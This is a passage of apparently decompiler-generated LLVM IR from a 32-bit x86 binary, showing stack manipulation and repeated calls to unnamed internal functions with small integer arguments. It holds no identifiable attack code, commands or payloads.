  %v1_8048f33 = phi i32 [ %v1_8048f23, %dec_label_pc_8048ee1 ], [ %v1_8048f33.pre, %dec_label_pc_8048f29 ]
  %v0_8048f33 = load i32, i32* @ecx, align 4
  %v2_8048f33 = add i32 %v1_8048f33, -4
  %v3_8048f33 = inttoptr i32 %v2_8048f33 to i32*
  store i32 %v0_8048f33, i32* %v3_8048f33, align 4
  %v0_8048f34 = load i32, i32* @ecx, align 4
  %v2_8048f34 = add i32 %v1_8048f33, -8
  %v3_8048f34 = inttoptr i32 %v2_8048f34 to i32*
  store i32 %v0_8048f34, i32* %v3_8048f34, align 4
  %v1_8048f35 = add i32 %v1_8048f33, -12
  %v2_8048f35 = inttoptr i32 %v1_8048f35 to i32*
  store i32 0, i32* %v2_8048f35, align 4
  %v1_8048f37 = add i32 %v1_8048f33, -16
  %v2_8048f37 = inttoptr i32 %v1_8048f37 to i32*
  store i32 45, i32* %v2_8048f37, align 4
  %v3_8048f39 = call i32 @function_80511f0(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_8048f39, i32* %eax.global-to-local, align 4
  %v0_8048f3e = load i32, i32* @esp, align 4
  %v9_8048f3e = icmp eq i32 %v0_8048f3e, -12
  store i1 %v9_8048f3e, i1* %zf.global-to-local, align 1
  %v2_8048f41 = add i32 %v0_8048f3e, 8
  %v3_8048f41 = inttoptr i32 %v2_8048f41 to i32*
  store i32 %v3_8048f39, i32* %v3_8048f41, align 4
  %v1_8048f42 = add i32 %v0_8048f3e, 120
  %v2_8048f42 = inttoptr i32 %v1_8048f42 to i32*
  %v3_8048f42 = load i32, i32* %v2_8048f42, align 4
  store i32 %v3_8048f42, i32* @edx, align 4
  %v2_8048f46 = add i32 %v0_8048f3e, 4
  %v3_8048f46 = inttoptr i32 %v2_8048f46 to i32*
  store i32 %v3_8048f42, i32* %v3_8048f46, align 4
  %v1_8048f47 = add i32 %v0_8048f3e, 147
  store i32 %v1_8048f47, i32* @ecx, align 4
  %v3_8048f4e = inttoptr i32 %v0_8048f3e to i32*
  store i32 %v1_8048f47, i32* %v3_8048f4e, align 4
  %v4_8048f4f = call i32 @function_8051ee0(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_8048f54 = load i32, i32* @esp, align 4
  %v1_8048f54 = add i32 %v0_8048f54, 16
  %v1_8048f57 = add i32 %v4_8048f4f, 1
  %v8_8048f57 = icmp eq i32 %v1_8048f57, 0
  store i1 %v8_8048f57, i1* %zf.global-to-local, align 1
  store i32 %v1_8048f57, i32* %eax.global-to-local, align 4
  br i1 %v8_8048f57, label %dec_label_pc_8048f64, label %dec_label_pc_8048f5a

dec_label_pc_8048f5a:                             ; preds = %dec_label_pc_8048f33
  %v1_8048f5a = add i32 %v0_8048f54, 108
  %v2_8048f5a = inttoptr i32 %v1_8048f5a to i32*
  %v3_8048f5a = load i32, i32* %v2_8048f5a, align 4
  store i32 %v3_8048f5a, i32* %eax.global-to-local, align 4
  %v1_8048f5e = inttoptr i32 %v3_8048f5a to i32*
  store i32 1, i32* %v1_8048f5e, align 4
  %v0_8048f64.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8048f64

dec_label_pc_8048f64:                             ; preds = %dec_label_pc_8048f33, %dec_label_pc_8048f5a
  %v0_8048f64 = phi i32 [ %v1_8048f54, %dec_label_pc_8048f33 ], [ %v0_8048f64.pre, %dec_label_pc_8048f5a ]
  %v1_8048f64 = add i32 %v0_8048f64, 92
  %v2_8048f64 = inttoptr i32 %v1_8048f64 to i32*
  %v3_8048f64 = load i32, i32* %v2_8048f64, align 4
  store i32 %v3_8048f64, i32* %edx.global-to-local, align 4
  %v1_8048f68 = add i32 %v3_8048f64, 4
  %v2_8048f68 = inttoptr i32 %v1_8048f68 to i32*
  store i32 0, i32* %v2_8048f68, align 4
  %v0_8048f6f = load i32, i32* %eax.global-to-local, align 4
  %v1_8048f6f = load i32, i32* @esp, align 4
  %v2_8048f6f = add i32 %v1_8048f6f, -4
  %v3_8048f6f = inttoptr i32 %v2_8048f6f to i32*
  store i32 %v0_8048f6f, i32* %v3_8048f6f, align 4
  %v0_8048f70 = load i32, i32* %eax.global-to-local, align 4
  %v2_8048f70 = add i32 %v1_8048f6f, -8
  %v3_8048f70 = inttoptr i32 %v2_8048f70 to i32*
  store i32 %v0_8048f70, i32* %v3_8048f70, align 4
  %v1_8048f71 = add i32 %v1_8048f6f, -12
  %v2_8048f71 = inttoptr i32 %v1_8048f71 to i32*
  store i32 0, i32* %v2_8048f71, align 4
  %v1_8048f73 = add i32 %v1_8048f6f, -16
  %v2_8048f73 = inttoptr i32 %v1_8048f73 to i32*
  store i32 44, i32* %v2_8048f73, align 4
  %v3_8048f75 = call i32 @function_80511f0(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_8048f75, i32* %eax.global-to-local, align 4
  %v0_8048f7a = load i32, i32* @esp, align 4
  %v9_8048f7a = icmp eq i32 %v0_8048f7a, -12
  store i1 %v9_8048f7a, i1* %zf.global-to-local, align 1
  %v2_8048f7d = add i32 %v0_8048f7a, 8
  %v3_8048f7d = inttoptr i32 %v2_8048f7d to i32*
  store i32 %v3_8048f75, i32* %v3_8048f7d, align 4
  %v1_8048f7e = add i32 %v0_8048f7a, 120
  %v2_8048f7e = inttoptr i32 %v1_8048f7e to i32*
  %v3_8048f7e = load i32, i32* %v2_8048f7e, align 4
  store i32 %v3_8048f7e, i32* %eax.global-to-local, align 4
  %v2_8048f82 = add i32 %v0_8048f7a, 4
  %v3_8048f82 = inttoptr i32 %v2_8048f82 to i32*
  store i32 %v3_8048f7e, i32* %v3_8048f82, align 4
  %v1_8048f83 = add i32 %v0_8048f7a, 147
  store i32 %v1_8048f83, i32* @ecx, align 4
  %v3_8048f8a = inttoptr i32 %v0_8048f7a to i32*
  store i32 %v1_8048f83, i32* %v3_8048f8a, align 4
  %v4_8048f8b = call i32 @function_8051ee0(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_8048f90 = load i32, i32* @esp, align 4
  %v1_8048f90 = add i32 %v0_8048f90, 16
  %v1_8048f93 = add i32 %v4_8048f8b, 1
  %v8_8048f93 = icmp eq i32 %v1_8048f93, 0
  store i1 %v8_8048f93, i1* %zf.global-to-local, align 1
  store i32 %v1_8048f93, i32* %eax.global-to-local, align 4
  br i1 %v8_8048f93, label %dec_label_pc_8049044, label %dec_label_pc_8048f9a

dec_label_pc_8048f9a:                             ; preds = %dec_label_pc_8048f64
  %v2_8048f9a = add i32 %v0_8048f90, 12
  %v3_8048f9a = inttoptr i32 %v2_8048f9a to i32*
  store i32 %v1_8048f93, i32* %v3_8048f9a, align 4
  %v0_8048f9b = load i32, i32* %eax.global-to-local, align 4
  %v2_8048f9b = add i32 %v0_8048f90, 8
  %v3_8048f9b = inttoptr i32 %v2_8048f9b to i32*
  store i32 %v0_8048f9b, i32* %v3_8048f9b, align 4
  %v1_8048f9c = add i32 %v0_8048f90, 4
  %v2_8048f9c = inttoptr i32 %v1_8048f9c to i32*
  store i32 0, i32* %v2_8048f9c, align 4
  %v2_8048f9e = inttoptr i32 %v0_8048f90 to i32*
  store i32 44, i32* %v2_8048f9e, align 4
  %v3_8048fa0 = call i32 @function_80511f0(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_8048fa0, i32* %eax.global-to-local, align 4
  %v0_8048fa5 = load i32, i32* @esp, align 4
  %v9_8048fa5 = icmp eq i32 %v0_8048fa5, -12
  store i1 %v9_8048fa5, i1* %zf.global-to-local, align 1
  %v2_8048fa8 = add i32 %v0_8048fa5, 8
  %v3_8048fa8 = inttoptr i32 %v2_8048fa8 to i32*
  store i32 %v3_8048fa0, i32* %v3_8048fa8, align 4
  %v1_8048fa9 = add i32 %v0_8048fa5, 120
  %v2_8048fa9 = inttoptr i32 %v1_8048fa9 to i32*
  %v3_8048fa9 = load i32, i32* %v2_8048fa9, align 4
  %v2_8048fad = add i32 %v0_8048fa5, 4
  %v3_8048fad = inttoptr i32 %v2_8048fad to i32*
  store i32 %v3_8048fa9, i32* %v3_8048fad, align 4
  %v1_8048fae = add i32 %v0_8048fa5, 147
  store i32 %v1_8048fae, i32* %eax.global-to-local, align 4
  %v3_8048fb5 = inttoptr i32 %v0_8048fa5 to i32*
  store i32 %v1_8048fae, i32* %v3_8048fb5, align 4
  %v4_8048fb6 = call i32 @function_8051ee0(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8048fb6, i32* %eax.global-to-local, align 4
  %v0_8048fbb = load i32, i32* @esp, align 4
  %v6_8048fbb = icmp eq i32 %v0_8048fbb, -16
  store i1 %v6_8048fbb, i1* %zf.global-to-local, align 1
  store i32 %v4_8048fb6, i32* %ebx.global-to-local, align 4
  %v2_8048fc0 = add i32 %v4_8048fb6, 147
  %v3_8048fc0 = add i32 %v2_8048fc0, %v0_8048fbb
  %v4_8048fc0 = inttoptr i32 %v3_8048fc0 to i8*
  %v5_8048fc0 = load i8, i8* %v4_8048fc0, align 1
  %v11_8048fc0 = icmp eq i8 %v5_8048fc0, 32
  %v1_8048fc8 = zext i1 %v11_8048fc0 to i32
  %v1_8048fcb = add i32 %v0_8048fbb, 147
  store i32 %v1_8048fcb, i32* %esi.global-to-local, align 4
  store i32 %v1_8048fc8, i32* %eax.global-to-local, align 4
  %v1_8048fd7 = add i32 %v0_8048fbb, 12
  %v2_8048fd7 = inttoptr i32 %v1_8048fd7 to i32*
  store i32 2, i32* %v2_8048fd7, align 4
  %v1_8048fd9 = add i32 %v0_8048fbb, 8
  %v2_8048fd9 = inttoptr i32 %v1_8048fd9 to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_8054ac6.10 to i32), i32* %v2_8048fd9, align 4
  %v0_8048fde = load i32, i32* %ebx.global-to-local, align 4
  %v1_8048fde = load i32, i32* %eax.global-to-local, align 4
  %v2_8048fde = add i32 %v1_8048fde, %v0_8048fde
  store i32 %v2_8048fde, i32* @ebx, align 4
  %v1_8048fe0 = add i32 %v0_8048fbb, 120
  %v2_8048fe0 = inttoptr i32 %v1_8048fe0 to i32*
  %v3_8048fe0 = load i32, i32* %v2_8048fe0, align 4
  %v2_8048fe4 = sub i32 %v3_8048fe0, %v2_8048fde
  store i32 %v2_8048fe4, i32* %eax.global-to-local, align 4
  %v0_8048fe6 = load i32, i32* %esi.global-to-local, align 4
  %v2_8048fe6 = add i32 %v0_8048fe6, %v2_8048fde
  %v12_8048fe6 = icmp eq i32 %v2_8048fe6, 0
  store i1 %v12_8048fe6, i1* %zf.global-to-local, align 1
  store i32 %v2_8048fe6, i32* @esi, align 4
  %v2_8048fe8 = add i32 %v0_8048fbb, 4
  %v3_8048fe8 = inttoptr i32 %v2_8048fe8 to i32*
  store i32 %v2_8048fe4, i32* %v3_8048fe8, align 4
  %v0_8048fe9 = load i32, i32* @esi, align 4
  %v3_8048fe9 = inttoptr i32 %v0_8048fbb to i32*
  store i32 %v0_8048fe9, i32* %v3_8048fe9, align 4
  %v0_8048fea = call i32 @function_8051ca0()
  store i32 %v0_8048fea, i32* %eax.global-to-local, align 4
  %v0_8048fef = load i32, i32* @esp, align 4
  %v1_8048fef = add i32 %v0_8048fef, 16
  store i32 %v0_8048fea, i32* %edx.global-to-local, align 4
  %v10_8048ff4 = icmp eq i32 %v0_8048fea, -1
  store i1 %v10_8048ff4, i1* %zf.global-to-local, align 1
  br i1 %v10_8048ff4, label %dec_label_pc_8049044, label %dec_label_pc_8048ff9

dec_label_pc_8048ff9:                             ; preds = %dec_label_pc_8048f9a
  %v10_8048ff9 = icmp eq i32 %v0_8048fea, 1
  store i1 %v10_8048ff9, i1* %zf.global-to-local, align 1
  %v7_8048ffc = icmp sgt i32 %v0_8048fea, 1
  br i1 %v7_8048ffc, label %dec_label_pc_8048ffe, label %dec_label_pc_8049001

dec_label_pc_8048ffe:                             ; preds = %dec_label_pc_8048ff9
  %v1_8048ffe = add i32 %v0_8048fea, -2
  %v9_8048ffe = icmp eq i32 %v1_8048ffe, 0
  store i1 %v9_8048ffe, i1* %zf.global-to-local, align 1
  store i32 %v1_8048ffe, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8049001

dec_label_pc_8049001:                             ; preds = %dec_label_pc_8048ff9, %dec_label_pc_8048ffe
  %v1_804900a = phi i32 [ %v0_8048fea, %dec_label_pc_8048ff9 ], [ %v1_8048ffe, %dec_label_pc_8048ffe ]
  %v1_8049001 = add i32 %v0_8048fef, 20920
  %v1_8049008 = load i32, i32* @ebx, align 4
  %v2_8049008 = add i32 %v1_8049001, %v1_8049008
  %v12_8049008 = icmp eq i32 %v2_8049008, 0
  store i1 %v12_8049008, i1* %zf.global-to-local, align 1
  store i32 %v2_8049008, i32* %eax.global-to-local, align 4
  %v2_804900a = add i32 %v1_804900a, -20773
  %v3_804900a = add i32 %v2_804900a, %v2_8049008
  %v4_804900a = inttoptr i32 %v3_804900a to i8*
  store i8 0, i8* %v4_804900a, align 1
  %v0_8049012 = load i32, i32* %eax.global-to-local, align 4
  %v1_8049012 = load i32, i32* @esp, align 4
  %v2_8049012 = add i32 %v1_8049012, -4
  %v3_8049012 = inttoptr i32 %v2_8049012 to i32*
  store i32 %v0_8049012, i32* %v3_8049012, align 4
  %v0_8049013 = load i32, i32* %eax.global-to-local, align 4
  %v2_8049013 = add i32 %v1_8049012, -8
  %v3_8049013 = inttoptr i32 %v2_8049013 to i32*
  store i32 %v0_8049013, i32* %v3_8049013, align 4
  %v1_8049014 = add i32 %v1_8049012, -12
  %v2_8049014 = inttoptr i32 %v1_8049014 to i32*
  store i32 0, i32* %v2_8049014, align 4
  %v1_8049016 = add i32 %v1_8049012, -16
  %v2_8049016 = inttoptr i32 %v1_8049016 to i32*
  store i32 43, i32* %v2_8049016, align 4
  %v3_8049018 = call i32 @function_80511f0(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_8049018, i32* %eax.global-to-local, align 4
  %v0_804901d = load i32, i32* @esi, align 4
  %v1_804901d = load i32, i32* @esp, align 4
  %v2_804901d = inttoptr i32 %v1_804901d to i32*
  store i32 %v0_804901d, i32* %v2_804901d, align 4
  store i32 %v3_8049018, i32* @ebx, align 4
  %v2_8049022 = call i32 @function_8051bf0(i8* %v1_8048752)
  store i32 %v2_8049022, i32* %eax.global-to-local, align 4
  %v0_8049027 = load i32, i32* @esp, align 4
  %v9_8049027 = icmp eq i32 %v0_8049027, -12
  store i1 %v9_8049027, i1* %zf.global-to-local, align 1
  %v0_804902a = load i32, i32* @ebx, align 4
  %v2_804902a = add i32 %v0_8049027, 8
  %v3_804902a = inttoptr i32 %v2_804902a to i32*
  store i32 %v0_804902a, i32* %v3_804902a, align 4
  %v2_804902b = add i32 %v0_8049027, 4
  %v3_804902b = inttoptr i32 %v2_804902b to i32*
  store i32 %v2_8049022, i32* %v3_804902b, align 4
  %v0_804902c = load i32, i32* @esi, align 4
  %v3_804902c = inttoptr i32 %v0_8049027 to i32*
  store i32 %v0_804902c, i32* %v3_804902c, align 4
  %v4_804902d = call i32 @function_8051ee0(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804902d, i32* %eax.global-to-local, align 4
  %v0_8049032 = load i32, i32* @esp, align 4
  %v1_8049032 = add i32 %v0_8049032, 16
  %v1_8049035 = icmp eq i32 %v4_804902d, 0
  store i1 %v1_8049035, i1* %zf.global-to-local, align 1
  br i1 %v1_8049035, label %dec_label_pc_8049044, label %dec_label_pc_8049039

dec_label_pc_8049039:                             ; preds = %dec_label_pc_8049001
  %v1_8049039 = add i32 %v0_8049032, 108
  %v2_8049039 = inttoptr i32 %v1_8049039 to i32*
  %v3_8049039 = load i32, i32* %v2_8049039, align 4
  store i32 %v3_8049039, i32* %edx.global-to-local, align 4
  %v1_804903d = add i32 %v3_8049039, 4
  %v2_804903d = inttoptr i32 %v1_804903d to i32*
  store i32 1, i32* %v2_804903d, align 4
  %v0_8049044.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8049044

dec_label_pc_8049044:                             ; preds = %dec_label_pc_8049001, %dec_label_pc_8048f9a, %dec_label_pc_8048f64, %dec_label_pc_8049039
  %v0_8049044 = phi i32 [ %v1_8049032, %dec_label_pc_8049001 ], [ %v1_8048fef, %dec_label_pc_8048f9a ], [ %v1_8048f90, %dec_label_pc_8048f64 ], [ %v0_8049044.pre, %dec_label_pc_8049039 ]
  %v1_8049044 = add i32 %v0_8049044, 92
  %v2_8049044 = inttoptr i32 %v1_8049044 to i32*
  %v3_8049044 = load i32, i32* %v2_8049044, align 4
  store i32 %v3_8049044, i32* %ecx.global-to-local, align 4
  %v1_8049048 = add i32 %v3_8049044, 8
  %v2_8049048 = inttoptr i32 %v1_8049048 to i32*
  store i32 0, i32* %v2_8049048, align 4
  %v0_804904f = load i32, i32* %eax.global-to-local, align 4
  %v1_804904f = load i32, i32* @esp, align 4
  %v2_804904f = add i32 %v1_804904f, -4
  %v3_804904f = inttoptr i32 %v2_804904f to i32*
  store i32 %v0_804904f, i32* %v3_804904f, align 4
  %v0_8049050 = load i32, i32* %eax.global-to-local, align 4
  %v2_8049050 = add i32 %v1_804904f, -8
  %v3_8049050 = inttoptr i32 %v2_8049050 to i32*
  store i32 %v0_8049050, i32* %v3_8049050, align 4
  %v1_8049051 = add i32 %v1_804904f, -12
  %v2_8049051 = inttoptr i32 %v1_8049051 to i32*
  store i32 0, i32* %v2_8049051, align 4
  %v1_8049053 = add i32 %v1_804904f, -16
  %v2_8049053 = inttoptr i32 %v1_8049053 to i32*
  store i32 41, i32* %v2_8049053, align 4
  %v3_8049055 = call i32 @function_80511f0(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_8049055, i32* %eax.global-to-local, align 4
  %v0_804905a = load i32, i32* @esp, align 4
  %v9_804905a = icmp eq i32 %v0_804905a, -12
  store i1 %v9_804905a, i1* %zf.global-to-local, align 1
  %v2_804905d = add i32 %v0_804905a, 8
  %v3_804905d = inttoptr i32 %v2_804905d to i32*
  store i32 %v3_8049055, i32* %v3_804905d, align 4
  %v1_804905e = add i32 %v0_804905a, 120
  %v2_804905e = inttoptr i32 %v1_804905e to i32*
  %v3_804905e = load i32, i32* %v2_804905e, align 4
  %v2_8049062 = add i32 %v0_804905a, 4
  %v3_8049062 = inttoptr i32 %v2_8049062 to i32*
  store i32 %v3_804905e, i32* %v3_8049062, align 4
  %v1_8049063 = add i32 %v0_804905a, 147
  store i32 %v1_8049063, i32* %eax.global-to-local, align 4
  %v3_804906a = inttoptr i32 %v0_804905a to i32*
  store i32 %v1_8049063, i32* %v3_804906a, align 4
  %v4_804906b = call i32 @function_8051ee0(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_8049070 = load i32, i32* @esp, align 4
  %v1_8049070 = add i32 %v0_8049070, 16
  %v1_8049073 = add i32 %v4_804906b, 1
  %v8_8049073 = icmp eq i32 %v1_8049073, 0
  store i1 %v8_8049073, i1* %zf.global-to-local, align 1
  store i32 %v1_8049073, i32* %eax.global-to-local, align 4
  br i1 %v8_8049073, label %dec_label_pc_8049124, label %dec_label_pc_804907a

dec_label_pc_804907a:                             ; preds = %dec_label_pc_8049044
  %v0_804907a = load i32, i32* @edi, align 4
  %v2_804907a = add i32 %v0_8049070, 12
  %v3_804907a = inttoptr i32 %v2_804907a to i32*
  store i32 %v0_804907a, i32* %v3_804907a, align 4
  %v0_804907b = load i32, i32* @edi, align 4
  %v2_804907b = add i32 %v0_8049070, 8
  %v3_804907b = inttoptr i32 %v2_804907b to i32*
  store i32 %v0_804907b, i32* %v3_804907b, align 4
  %v1_804907c = add i32 %v0_8049070, 4
  %v2_804907c = inttoptr i32 %v1_804907c to i32*
  store i32 0, i32* %v2_804907c, align 4
  %v2_804907e = inttoptr i32 %v0_8049070 to i32*
  store i32 41, i32* %v2_804907e, align 4
  %v3_8049080 = call i32 @function_80511f0(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_8049080, i32* %eax.global-to-local, align 4
  %v0_8049085 = load i32, i32* @esp, align 4
  %v9_8049085 = icmp eq i32 %v0_8049085, -12
  store i1 %v9_8049085, i1* %zf.global-to-local, align 1
  %v2_8049088 = add i32 %v0_8049085, 8
  %v3_8049088 = inttoptr i32 %v2_8049088 to i32*
  store i32 %v3_8049080, i32* %v3_8049088, align 4
  %v1_8049089 = add i32 %v0_8049085, 120
  %v2_8049089 = inttoptr i32 %v1_8049089 to i32*
  %v3_8049089 = load i32, i32* %v2_8049089, align 4
  %v2_804908d = add i32 %v0_8049085, 4
  %v3_804908d = inttoptr i32 %v2_804908d to i32*
  store i32 %v3_8049089, i32* %v3_804908d, align 4
  %v1_804908e = add i32 %v0_8049085, 147
  store i32 %v1_804908e, i32* @edx, align 4
  %v3_8049095 = inttoptr i32 %v0_8049085 to i32*
  store i32 %v1_804908e, i32* %v3_8049095, align 4
  %v4_8049096 = call i32 @function_8051ee0(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8049096, i32* %eax.global-to-local, align 4
  %v0_804909b = load i32, i32* @esp, align 4
  %v6_804909b = icmp eq i32 %v0_804909b, -16
  store i1 %v6_804909b, i1* %zf.global-to-local, align 1
  store i32 %v4_8049096, i32* %ebx.global-to-local, align 4
  %v2_80490a0 = add i32 %v4_8049096, 147
  %v3_80490a0 = add i32 %v2_80490a0, %v0_804909b
  %v4_80490a0 = inttoptr i32 %v3_80490a0 to i8*
  %v5_80490a0 = load i8, i8* %v4_80490a0, align 1
  %v11_80490a0 = icmp eq i8 %v5_80490a0, 32
  %v1_80490a8 = zext i1 %v11_80490a0 to i32
  %v1_80490ab = add i32 %v0_804909b, 147
  store i32 %v1_80490ab, i32* %esi.global-to-local, align 4
  store i32 %v1_80490a8, i32* %eax.global-to-local, align 4
  %v1_80490b7 = add i32 %v0_804909b, 12
  %v2_80490b7 = inttoptr i32 %v1_80490b7 to i32*
  store i32 2, i32* %v2_80490b7, align 4
  %v1_80490b9 = add i32 %v0_804909b, 8
  %v2_80490b9 = inttoptr i32 %v1_80490b9 to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_8054ac6.10 to i32), i32* %v2_80490b9, align 4
  %v0_80490be = load i32, i32* %ebx.global-to-local, align 4
  %v1_80490be = load i32, i32* %eax.global-to-local, align 4
  %v2_80490be = add i32 %v1_80490be, %v0_80490be
  store i32 %v2_80490be, i32* @ebx, align 4
  %v1_80490c0 = add i32 %v0_804909b, 120
  %v2_80490c0 = inttoptr i32 %v1_80490c0 to i32*
  %v3_80490c0 = load i32, i32* %v2_80490c0, align 4
  %v2_80490c4 = sub i32 %v3_80490c0, %v2_80490be
  store i32 %v2_80490c4, i32* %eax.global-to-local, align 4
  %v0_80490c6 = load i32, i32* %esi.global-to-local, align 4
  %v2_80490c6 = add i32 %v0_80490c6, %v2_80490be
  %v12_80490c6 = icmp eq i32 %v2_80490c6, 0
  store i1 %v12_80490c6, i1* %zf.global-to-local, align 1
  store i32 %v2_80490c6, i32* @esi, align 4
  %v2_80490c8 = add i32 %v0_804909b, 4
  %v3_80490c8 = inttoptr i32 %v2_80490c8 to i32*
  store i32 %v2_80490c4, i32* %v3_80490c8, align 4
  %v0_80490c9 = load i32, i32* @esi, align 4
  %v3_80490c9 = inttoptr i32 %v0_804909b to i32*
  store i32 %v0_80490c9, i32* %v3_80490c9, align 4
  %v0_80490ca = call i32 @function_8051ca0()
  store i32 %v0_80490ca, i32* %eax.global-to-local, align 4
  %v0_80490cf = load i32, i32* @esp, align 4
  %v1_80490cf = add i32 %v0_80490cf, 16
  store i32 %v0_80490ca, i32* %edx.global-to-local, align 4
  %v10_80490d4 = icmp eq i32 %v0_80490ca, -1
  store i1 %v10_80490d4, i1* %zf.global-to-local, align 1
  br i1 %v10_80490d4, label %dec_label_pc_8049124, label %dec_label_pc_80490d9

dec_label_pc_80490d9:                             ; preds = %dec_label_pc_804907a
  %v10_80490d9 = icmp eq i32 %v0_80490ca, 1
  store i1 %v10_80490d9, i1* %zf.global-to-local, align 1
  %v7_80490dc = icmp sgt i32 %v0_80490ca, 1
  br i1 %v7_80490dc, label %dec_label_pc_80490de, label %dec_label_pc_80490e1

dec_label_pc_80490de:                             ; preds = %dec_label_pc_80490d9
  %v1_80490de = add i32 %v0_80490ca, -2
  %v9_80490de = icmp eq i32 %v1_80490de, 0
  store i1 %v9_80490de, i1* %zf.global-to-local, align 1
  store i32 %v1_80490de, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80490e1

dec_label_pc_80490e1:                             ; preds = %dec_label_pc_80490d9, %dec_label_pc_80490de
  %v1_80490ea = phi i32 [ %v0_80490ca, %dec_label_pc_80490d9 ], [ %v1_80490de, %dec_label_pc_80490de ]
  %v1_80490e1 = add i32 %v0_80490cf, 20920
  %v1_80490e8 = load i32, i32* @ebx, align 4
  %v2_80490e8 = add i32 %v1_80490e1, %v1_80490e8
  %v12_80490e8 = icmp eq i32 %v2_80490e8, 0
  store i1 %v12_80490e8, i1* %zf.global-to-local, align 1
  store i32 %v2_80490e8, i32* %eax.global-to-local, align 4
  %v2_80490ea = add i32 %v1_80490ea, -20773
  %v3_80490ea = add i32 %v2_80490ea, %v2_80490e8
  %v4_80490ea = inttoptr i32 %v3_80490ea to i8*
  store i8 0, i8* %v4_80490ea, align 1
  %v0_80490f2 = load i32, i32* @ebx, align 4
  %v1_80490f2 = load i32, i32* @esp, align 4
  %v2_80490f2 = add i32 %v1_80490f2, -4
  %v3_80490f2 = inttoptr i32 %v2_80490f2 to i32*
  store i32 %v0_80490f2, i32* %v3_80490f2, align 4
  %v0_80490f3 = load i32, i32* @ebx, align 4
  %v2_80490f3 = add i32 %v1_80490f2, -8
  %v3_80490f3 = inttoptr i32 %v2_80490f3 to i32*
  store i32 %v0_80490f3, i32* %v3_80490f3, align 4
  %v1_80490f4 = add i32 %v1_80490f2, -12
  %v2_80490f4 = inttoptr i32 %v1_80490f4 to i32*
  store i32 0, i32* %v2_80490f4, align 4
  %v1_80490f6 = add i32 %v1_80490f2, -16
  %v2_80490f6 = inttoptr i32 %v1_80490f6 to i32*
  store i32 42, i32* %v2_80490f6, align 4
  %v3_80490f8 = call i32 @function_80511f0(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_80490f8, i32* %eax.global-to-local, align 4
  %v0_80490fd = load i32, i32* @esi, align 4
  %v1_80490fd = load i32, i32* @esp, align 4
  %v2_80490fd = inttoptr i32 %v1_80490fd to i32*
  store i32 %v0_80490fd, i32* %v2_80490fd, align 4
  store i32 %v3_80490f8, i32* @ebx, align 4
  %v2_8049102 = call i32 @function_8051bf0(i8* %v1_8048752)
  store i32 %v2_8049102, i32* %eax.global-to-local, align 4
  %v0_8049107 = load i32, i32* @esp, align 4
  %v9_8049107 = icmp eq i32 %v0_8049107, -12
  store i1 %v9_8049107, i1* %zf.global-to-local, align 1
  %v0_804910a = load i32, i32* @ebx, align 4
  %v2_804910a = add i32 %v0_8049107, 8
  %v3_804910a = inttoptr i32 %v2_804910a to i32*
  store i32 %v0_804910a, i32* %v3_804910a, align 4
  %v2_804910b = add i32 %v0_8049107, 4
  %v3_804910b = inttoptr i32 %v2_804910b to i32*
  store i32 %v2_8049102, i32* %v3_804910b, align 4
  %v0_804910c = load i32, i32* @esi, align 4
  %v3_804910c = inttoptr i32 %v0_8049107 to i32*
  store i32 %v0_804910c, i32* %v3_804910c, align 4
  %v4_804910d = call i32 @function_8051ee0(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804910d, i32* %eax.global-to-local, align 4
  %v0_8049112 = load i32, i32* @esp, align 4
  %v1_8049112 = add i32 %v0_8049112, 16
  %v1_8049115 = icmp eq i32 %v4_804910d, 0
  store i1 %v1_8049115, i1* %zf.global-to-local, align 1
  br i1 %v1_8049115, label %dec_label_pc_8049124, label %dec_label_pc_8049119

dec_label_pc_8049119:                             ; preds = %dec_label_pc_80490e1
  %v1_8049119 = add i32 %v0_8049112, 108
  %v2_8049119 = inttoptr i32 %v1_8049119 to i32*
  %v3_8049119 = load i32, i32* %v2_8049119, align 4
  store i32 %v3_8049119, i32* @ecx, align 4
  %v1_804911d = add i32 %v3_8049119, 8
  %v2_804911d = inttoptr i32 %v1_804911d to i32*
  store i32 1, i32* %v2_804911d, align 4
  %v1_8049124.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8049124

dec_label_pc_8049124:                             ; preds = %dec_label_pc_80490e1, %dec_label_pc_804907a, %dec_label_pc_8049044, %dec_label_pc_8049119
  %v1_8049124 = phi i32 [ %v1_8049112, %dec_label_pc_80490e1 ], [ %v1_80490cf, %dec_label_pc_804907a ], [ %v1_8049070, %dec_label_pc_8049044 ], [ %v1_8049124.pre, %dec_label_pc_8049119 ]
  %v0_8049124 = load i32, i32* @ecx, align 4
  %v2_8049124 = add i32 %v1_8049124, -4
  %v3_8049124 = inttoptr i32 %v2_8049124 to i32*
  store i32 %v0_8049124, i32* %v3_8049124, align 4
  %v0_8049125 = load i32, i32* @ecx, align 4
  %v2_8049125 = add i32 %v1_8049124, -8
  %v3_8049125 = inttoptr i32 %v2_8049125 to i32*
  store i32 %v0_8049125, i32* %v3_8049125, align 4
  %v1_8049126 = add i32 %v1_8049124, -12
  %v2_8049126 = inttoptr i32 %v1_8049126 to i32*
  store i32 0, i32* %v2_8049126, align 4
